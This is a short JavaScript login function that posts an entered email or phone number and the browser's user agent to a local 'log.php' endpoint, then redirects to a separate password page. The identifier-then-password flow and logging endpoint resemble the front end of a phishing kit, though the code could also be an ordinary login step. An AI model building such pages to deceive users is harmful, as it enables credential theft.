function login(){
	

var USER	 =	$("#user_name").val();
	
	//alert(ID_sg);
	//alert(PASS_sg);
	
 if(USER==''){

swal({
icon: 'error',
title: 'Warning !',
text: "Please enter your email or phone number"

})	

return false;	
} 



var data_log = 
{
DEVICE       : navigator.userAgent,
USER		    :   USER

}; 


var _url = './config/log.php';
$('#cover-spin').show(0);
$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 
localStorage.setItem("user",USER);

if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	

setTimeout(function(){ 
   /* $('#cover-spin').hide();*/
    window.location="signinpass.html";
    
}, 1000);
    

} 


})
}